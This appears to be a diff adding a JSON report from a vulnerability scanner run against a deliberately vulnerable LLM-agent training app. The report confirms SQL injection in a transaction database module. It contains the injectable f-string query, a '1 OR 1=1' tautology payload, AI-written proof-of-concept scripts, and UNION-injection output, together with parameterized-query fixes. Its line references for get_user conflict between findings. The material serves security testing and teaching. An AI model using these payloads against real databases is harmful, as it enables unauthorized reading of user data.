@@ -1,0 +1,198 @@
+{
+  "scan_metadata": {
+    "tool": "AgentGuard v0.2 (with self-validation)",
+    "timestamp": "2026-08-11T18:13:24.757019",
+    "target_file": "/home/student/realworld/damn-vulnerable-llm-agent/transaction_db.py",
+    "framework": "custom",
+    "self_validation": true
+  },
+  "summary": {
+    "total": 3,
+    "confirmed": 2,
+    "suspected": 1,
+    "dismissed": 0
+  },
+  "validated_findings": [
+    {
+      "finding": {
+        "vuln_id": "AGT-007",
+        "vuln_name": "Hardcoded Secrets in Agent Configuration",
+        "severity": "HIGH",
+        "location": "/home/student/realworld/damn-vulnerable-llm-agent/transaction_db.py",
+        "description": "High-entropy string literal \u2014 likely a credential.",
+        "evidence": "INSERT OR IGNORE INTO Transact...",
+        "impact": "Possible embedded secret or token.",
+        "remediation": "Move to environment variables.",
+        "confidence": 0.65,
+        "source": "static",
+        "ai_fix": "",
+        "confidence_label": "Medium"
+      },
+      "bucket": "SUSPECTED",
+      "final_confidence": 0.65,
+      "attempts": [
+        {
+          "attempt": 1,
+          "strategy": "Static secret extraction via file read",
+          "source": "template",
+          "success_level": "REACHED",
+          "confidence": 0.3,
+          "elapsed_sec": 0.889,
+          "timed_out": false,
+          "crashed": false,
+          "flags_seen": [
+            "[AGENTGUARD_REACHED_VULN]"
+          ],
+          "benign_clean": null,
+          "stdout_excerpt": "[AGENTGUARD_REACHED_VULN]\n",
+          "stderr": "",
+          "notes": [
+            "Differential test skipped (no benign code or N/A)."
+          ],
+          "used_docker": true
+        }
+      ],
+      "notes": [],
+      "ai_hypothesis": "",
+      "ai_method": "",
+      "ai_exploit_code": "",
+      "ai_fix": "",
+      "ai_verdict": "",
+      "ai_tokens_in": 0,
+      "ai_tokens_out": 0,
+      "ai_tokens_thinking": 0
+    },
+    {
+      "finding": {
+        "vuln_id": "AGT-006",
+        "vuln_name": "Missing Tool Input Validation",
+        "severity": "HIGH",
+        "location": "/home/student/realworld/damn-vulnerable-llm-agent/transaction_db.py:62",
+        "description": "SQL query is built by string interpolation of a variable, creating a SQL injection vector. If any interpolated value originates from agent or user input, it can alter the query.",
+        "evidence": "execute(...) with an interpolated SQL string at line 62",
+        "impact": "An attacker who influences the interpolated value can read or modify arbitrary database rows, bypassing intended scoping.",
+        "remediation": "Use parameterised queries: pass placeholders (? or %s) in the SQL and supply values as a separate argument tuple, e.g. cursor.execute('SELECT ... WHERE id = ?', (user_id,)).",
+        "confidence": 0.8,
+        "source": "static",
+        "ai_fix": "",
+        "confidence_label": "Medium"
+      },
+      "bucket": "CONFIRMED",
+      "final_confidence": 1.0,
+      "attempts": [
+        {
+          "attempt": 1,
+          "strategy": "AI-authored bespoke exploit (self-validation prover)",
+          "source": "ai-prover",
+          "success_level": "NONE",
+          "confidence": 0.0,
+          "elapsed_sec": 0.796,
+          "timed_out": false,
+          "crashed": false,
+          "flags_seen": [],
+          "stdout_excerpt": "[ERROR] unable to open database file\n",
+          "stderr": "",
+          "notes": [
+            "Differential test skipped (no benign code or N/A)."
+          ],
+          "used_docker": true
+        },
+        {
+          "attempt": 1,
+          "strategy": "UNION-based SQL injection (class-method target) with dynamic column-count discovery",
+          "source": "template",
+          "success_level": "EXTRACTED",
+          "confidence": 1.0,
+          "elapsed_sec": 0.707,
+          "timed_out": false,
+          "crashed": false,
+          "flags_seen": [
+            "[AGENTGUARD_REACHED_VULN]",
+            "[AGENTGUARD_TRIGGERED_VULN]",
+            "[AGENTGUARD_EXTRACTED_PROOF]"
+          ],
+          "benign_clean": true,
+          "stdout_excerpt": "[AGENTGUARD_REACHED_VULN]\n[AGENTGUARD_RESULT_ROWS] [\n    {\n        \"transactionId\": \"AGENTGUARD_COL0\",\n        \"userId\": \"AGENTGUARD_COL1\",\n        \"reference\": \"AGENTGUARD_COL2\",\n        \"recipient\": \"AGENTGUARD_COL3\",\n        \"amount\": \"AGENTGUARD_C\n[AGENTGUARD_COLUMN_COUNT] 5\n[AGENTGUARD_TRIGGERED_VULN]\n[AGENTGUARD_EXTRACTED_PROOF]\n",
+          "stderr": "",
+          "notes": [],
+          "used_docker": true
+        }
+      ],
+      "notes": [],
+      "ai_hypothesis": "The `get_user` method at line 62 constructs an SQL query by directly interpolating the `user_id` parameter into the query string using an f-string (`f\"SELECT userId,username FROM Users WHERE userId = {str(user_id)}\"`). Since `user_id` is not sanitized or parameterized, an attacker-controlled value containing SQL syntax (e.g., `1 OR 1=1`) can alter the query logic, making this SQL injection vulnerability genuinely reachable.",
+      "ai_method": "Instantiate `TransactionDb`, then call `get_user` with a malicious `user_id` payload (`1 OR 1=1`) that should return all users instead of just user 1. Verify the JSON response contains multiple users (MartyMcFly, DocBrown, etc.), proving the injected SQL altered the query.",
+      "ai_exploit_code": "import sys\nimport importlib.util\n\n# Load the target module from the given file path\nspec = importlib.util.spec_from_file_location(\n    \"transaction_db\", \"/home/student/realworld/damn-vulnerable-llm-agent/transaction_db.py\"\n)\nmodule = importlib.util.module_from_spec(spec)\nsys.modules[\"transaction_db\"] = module\nspec.loader.exec_module(module)\n\nTransactionDb = module.TransactionDb\n\ndef main():\n    try:\n        db = TransactionDb()\n        # SQL injection payload: returns all rows because 1=1 is always true\n        payload = \"1 OR 1=1\"\n        result_json = db.get_user(payload)\n        print(f\"[DEBUG] Result: {result_json}\")\n        import json\n        users = json.loads(result_json)\n        # If injection worked, we should get all 4 users, not just userId=1\n        if len(users) > 1:\n            print(\"[AGENTGUARD_REACHED_VULN]\")\n            print(\"[AGENTGUARD_TRIGGERED_VULN]\")\n            print(f\"[AGENTGUARD_EXTRACTED_PROOF] Retrieved {len(users)} users via injection: {[u['username'] for u in users]}\")\n        else:\n            print(\"[FAIL] Injection did not return extra rows\")\n    except Exception as e:\n        print(f\"[ERROR] {e}\")\n    finally:\n        try:\n            db.close()\n        except Exception:\n            pass\n\nif __name__ == \"__main__\":\n    main()",
+      "ai_fix": "Replace the vulnerable line 62 with a parameterized query:\n```python\ncursor.execute(\"SELECT userId, username FROM Users WHERE userId = ?\", (user_id,))\n```\nAlso fix line 52 in `get_user_transactions` similarly:\n```python\ncursor.execute(\"SELECT * FROM Transactions WHERE userId = ?\", (userId,))\n```",
+      "ai_verdict": "COULD-NOT-TEST (AI exploit did not fire)",
+      "ai_tokens_in": 1515,
+      "ai_tokens_out": 840,
+      "ai_tokens_thinking": 0
+    },
+    {
+      "finding": {
+        "vuln_id": "AGT-006",
+        "vuln_name": "Missing Tool Input Validation",
+        "severity": "HIGH",
+        "location": "/home/student/realworld/damn-vulnerable-llm-agent/transaction_db.py:76",
+        "description": "SQL query is built by string interpolation of a variable, creating a SQL injection vector. If any interpolated value originates from agent or user input, it can alter the query.",
+        "evidence": "execute(...) with an interpolated SQL string at line 76",
+        "impact": "An attacker who influences the interpolated value can read or modify arbitrary database rows, bypassing intended scoping.",
+        "remediation": "Use parameterised queries: pass placeholders (? or %s) in the SQL and supply values as a separate argument tuple, e.g. cursor.execute('SELECT ... WHERE id = ?', (user_id,)).",
+        "confidence": 0.8,
+        "source": "static",
+        "ai_fix": "",
+        "confidence_label": "Medium"
+      },
+      "bucket": "CONFIRMED",
+      "final_confidence": 1.0,
+      "attempts": [
+        {
+          "attempt": 1,
+          "strategy": "AI-authored bespoke exploit (self-validation prover)",
+          "source": "ai-prover",
+          "success_level": "NONE",
+          "confidence": 0.0,
+          "elapsed_sec": 0.711,
+          "timed_out": false,
+          "crashed": false,
+          "flags_seen": [],
+          "stdout_excerpt": "",
+          "stderr": "Traceback (most recent call last):\n  File \"/sandbox/exploit.py\", line 120, in <module>\n    verify_sql_injection()\n  File \"/sandbox/exploit.py\", line 101, in verify_sql_injection\n    db = TransactionDb()\n         ^^^^^^^^^^^^^^^\n  File \"/sandbox/transaction_db.py\", line 7, in __init__\n    self.conn = sqlite3.connect(db_name)\n                ^^^^^^^^^^^^^^^^^^^^^^^^\nsqlite3.OperationalError: unable to open database file\n",
+          "notes": [
+            "Differential test skipped (no benign code or N/A)."
+          ],
+          "used_docker": true
+        },
+        {
+          "attempt": 1,
+          "strategy": "UNION-based SQL injection (class-method target) with dynamic column-count discovery",
+          "source": "template",
+          "success_level": "EXTRACTED",
+          "confidence": 1.0,
+          "elapsed_sec": 0.603,
+          "timed_out": false,
+          "crashed": false,
+          "flags_seen": [
+            "[AGENTGUARD_REACHED_VULN]",
+            "[AGENTGUARD_TRIGGERED_VULN]",
+            "[AGENTGUARD_EXTRACTED_PROOF]"
+          ],
+          "benign_clean": true,
+          "stdout_excerpt": "[AGENTGUARD_REACHED_VULN]\n[AGENTGUARD_RESULT_ROWS] [\n    {\n        \"userId\": \"AGENTGUARD_COL0\",\n        \"username\": \"AGENTGUARD_COL1\"\n    }\n]\n[AGENTGUARD_COLUMN_COUNT] 2\n[AGENTGUARD_TRIGGERED_VULN]\n[AGENTGUARD_EXTRACTED_PROOF]\n",
+          "stderr": "",
+          "notes": [],
+          "used_docker": true
+        }
+      ],
+      "notes": [],
+      "ai_hypothesis": "The `get_user` method at line 76 uses f-string interpolation to embed `user_id` directly into the SQL query without parameterization, making it vulnerable to SQL injection. Since `user_id` is passed as a method argument and could originate from agent or user input, an attacker can supply a malicious value (e.g., `1 OR 1=1`) to alter the query logic and extract unauthorized data.",
+      "ai_method": "The verification script instantiates `TransactionDb`, then calls `get_user` with a payload that injects a tautology (`1 OR 1=1`) to bypass the userId filter and return all users. It parses the returned JSON and confirms that more than the single expected user is returned, proving the injection altered the query.",
+      "ai_exploit_code": "import importlib.util\nimport sys\nimport json\n\n# Load the target module from the given file path\nspec = importlib.util.spec_from_file_location(\"transaction_db\", \"/home/student/realworld/damn-vulnerable-llm-agent/transaction_db.py\")\nmodule = importlib.util.module_from_spec(spec)\nsys.modules[\"transaction_db\"] = module\nspec.loader.exec_module(module)\n\nTransactionDb = module.TransactionDb\n\ndef verify_sql_injection():\n    db = TransactionDb()\n    try:\n        # Payload: inject a tautology to return all rows\n        payload = \"1 OR 1=1\"\n        result_json = db.get_user(payload)\n        users = json.loads(result_json)\n        # Expect 4 users in seed data; if injection works, we get all 4\n        if len(users) > 1:\n            print(\"[AGENTGUARD_REACHED_VULN]\")\n            print(\"[AGENTGUARD_TRIGGERED_VULN]\")\n            print(\"[AGENTGUARD_EXTRACTED_PROOF]\")\n        else:\n            print(\"Verification failed: injection did not return extra rows\")\n    except Exception as e:\n        print(f\"Verification error: {e}\")\n    finally:\n        db.close()\n\nif __name__ == \"__main__\":\n    verify_sql_injection()",
+      "ai_fix": "Replace the f-string interpolation with a parameterized query. Change line 76 from:\n    cursor.execute(f\"SELECT userId,username FROM Users WHERE userId = {str(user_id)}\")\nto:\n    cursor.execute(\"SELECT userId,username FROM Users WHERE userId = ?\", (user_id,))\nApply the same fix to `get_user_transactions` at line 62.",
+      "ai_verdict": "COULD-NOT-TEST (AI exploit did not fire)",
+      "ai_tokens_in": 1515,
+      "ai_tokens_out": 761,
+      "ai_tokens_thinking": 0
+    }
+  ]
+}
